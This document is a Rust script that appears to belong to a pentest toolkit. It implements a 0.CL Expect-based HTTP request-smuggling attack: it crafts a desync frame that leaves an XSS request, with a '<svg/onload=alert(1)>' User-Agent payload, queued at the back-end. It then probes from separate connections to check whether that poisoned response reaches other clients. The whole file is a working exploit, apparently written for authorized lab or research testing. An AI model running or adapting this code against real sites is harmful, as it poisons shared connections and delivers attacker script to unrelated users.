#!/usr/bin/env rust-script
//! name: zerocl_deliver
//! description: 0.CL Expect-desync delivery probe - arms the broken-Expect 0.CL primitive with a response-surplus deficit (R1 is a complete filler request so the front-end's request/response count balances, R2 is the XSS request left HOLDING at the back-end with a body deficit), then probes from a SECOND client connection while the arm socket is still open and again after it closes, so it is decidable whether the front-end hands the pending upstream connection (and with it the queued XSS response) to another client - the victim-delivery step of the RQP chain.
//! version: 1.0.0
//! args: <base-url> [--host H] [--probe-path /] [--ua P] [--deficit N] [--filler-path /] [--read-ms N] [--probe-read-ms N] [--settle-ms N] [--rounds N] [--selftest]
//! keywords: smuggling, desync, 0cl, expect, response-queue, poisoning, rqp, delivery, probe, xss
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(400))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

// Read until the deadline (ms) or a short quiet period.
fn drain(s: &mut Tls, ms: u64, quiet_ms: u64) -> Vec<u8> {
    let mut buf = Vec::new();
    let start = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        if start.elapsed() >= Duration::from_millis(ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                let last = Instant::now();
                while last.elapsed() < Duration::from_millis(quiet_ms) && start.elapsed() < Duration::from_millis(ms) {
                    std::thread::sleep(Duration::from_millis(20));
                }
            }
            Err(_) => break,
        }
    }
    buf
}

fn marker_response(buf: &[u8], marker: &str) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    let mut body_lens: Vec<usize> = Vec::new();
    for line in text.split("\r\n") {
        if line.starts_with("HTTP/1.") {
            statuses.push(line.to_string());
        }
        if line.to_ascii_lowercase().starts_with("content-length:") {
            if let Ok(n) = line.split(':').nth(1).unwrap_or("").trim().parse::<usize>() {
                body_lens.push(n);
            }
        }
    }
    json!({
        "bytes": buf.len(),
        "status_lines": statuses,
        "content_lengths": body_lens,
        "marker_hits": text.matches(marker).count(),
        "contains_onload": text.contains("onload=alert"),
        "preview": text.chars().take(160).collect::<String>(),
    })
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut host_override: Option<String> = None;
    let mut probe_path = "/".to_string();
    let mut filler_path = "/".to_string();
    let mut ua = "\"><svg/onload=alert(1)>".to_string();
    let mut deficit: usize = 2;
    let mut read_ms: u64 = 4000;
    let mut probe_read_ms: u64 = 4000;
    let mut settle_ms: u64 = 250;
    let mut rounds: u64 = 1;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--selftest" => {
                let h = "x.y";
                let r2 = format!("GET /post?postId=1 HTTP/1.1\r\nHost: {h}\r\nUser-Agent: a\r\nContent-Length: 0\r\n\r\n");
                let ok = r2.contains("Content-Length: 0") && marker_response(b"HTTP/1.1 200 OK\r\n\r\nab", "ab")["marker_hits"] == 1;
                pi_rust_lib::report::success("zerocl_deliver", json!({"selftest": if ok {"ok"} else {"fail"}}), "frame text + marker parser are the pure roots").unwrap_or(());
                return;
            }
            "--host" => {
                i += 1;
                host_override = args.get(i).cloned();
            }
            "--probe-path" => {
                i += 1;
                probe_path = args.get(i).cloned().unwrap_or(probe_path);
            }
            "--filler-path" => {
                i += 1;
                filler_path = args.get(i).cloned().unwrap_or(filler_path);
            }
            "--ua" => {
                i += 1;
                ua = args.get(i).cloned().unwrap_or(ua);
            }
            "--deficit" => {
                i += 1;
                deficit = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(deficit);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--probe-read-ms" => {
                i += 1;
                probe_read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(probe_read_ms);
            }
            "--settle-ms" => {
                i += 1;
                settle_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(settle_ms);
            }
            "--rounds" => {
                i += 1;
                rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds);
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("zerocl_deliver", "usage", "call as: zerocl_deliver <base-url> [--probe-path /] [--deficit 2] [--rounds N]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = host_override.unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);

    // R1: complete filler request, gives the front-end a matching response for
    // the second downstream request it parsed (the "cradle").
    let r1 = format!("GET {filler_path} HTTP/1.1\r\nHost: {host}\r\n\r\n");
    // R2: the XSS request whose body the back-end is left waiting for (deficit).
    let r2 = format!(
        "GET /post?postId=1 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Length: {deficit}\r\n\r\n"
    );
    let body = format!("{r1}{r2}");
    let cradle = format!("GET / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {}\r\n\r\n", body.len());
    let primer = format!(
        "GET / HTTP/1.1\r\nHost: {host}\r\nExpect: 100-continue\r\nContent-Length: {}\r\n\r\n",
        cradle.len()
    );
    let frame = format!("{primer}{cradle}{body}");

    let probe = format!("GET {probe_path} HTTP/1.1\r\nHost: {host}\r\n\r\n");
    let marker = "onload=alert";

    let mut out: Vec<Value> = Vec::new();
    let mut err = String::new();
    for round in 0..rounds {
        if round > 0 {
            std::thread::sleep(Duration::from_millis(settle_ms));
        }
        timeout::check();
        let mut arm_sock = match connect(&host, port) {
            Ok(s) => s,
            Err(e) => {
                err = e;
                break;
            }
        };
        if let Err(e) = arm_sock.write_all(frame.as_bytes()) {
            err = format!("arm write: {e}");
            break;
        }
        let _ = arm_sock.flush();
        let arm_buf = drain(&mut arm_sock, read_ms, 600);

        // Probe while the arm socket is still open.
        let mut probe_open = Value::Null;
        if let Ok(mut p) = connect(&host, port) {
            if p.write_all(probe.as_bytes()).is_ok() {
                let b = drain(&mut p, probe_read_ms, 500);
                probe_open = marker_response(&b, marker);
            }
        }

        // Close the arm socket, then probe once more.
        drop(arm_sock);
        std::thread::sleep(Duration::from_millis(settle_ms));
        let mut probe_closed = Value::Null;
        if let Ok(mut p) = connect(&host, port) {
            if p.write_all(probe.as_bytes()).is_ok() {
                let b = drain(&mut p, probe_read_ms, 500);
                probe_closed = marker_response(&b, marker);
            }
        }

        out.push(json!({
            "round": round,
            "frame_bytes": frame.len(),
            "primer_cl": primer.len() - 0,
            "cradle_cl": cradle.len(),
            "deficit": deficit,
            "arm": marker_response(&arm_buf, marker),
            "probe_while_arm_open": probe_open,
            "probe_after_arm_close": probe_closed,
        }));
        // If any probe already saw the XSS page, stop early: delivery proven.
        let hit = out.last().map(|r| {
            r["probe_while_arm_open"]["contains_onload"] == json!(true)
                || r["probe_after_arm_close"]["contains_onload"] == json!(true)
        }).unwrap_or(false);
        if hit {
            break;
        }
    }

    pi_rust_lib::report::success(
        "zerocl_deliver",
        json!({
            "url": base,
            "host": host,
            "xss_path": "/post?postId=1",
            "rounds": out,
            "last_error": err,
        }),
        "a probe response containing onload=alert proves cross-client delivery; otherwise the front-end keeps the pending upstream connection private",
    )
    .unwrap_or(());
}
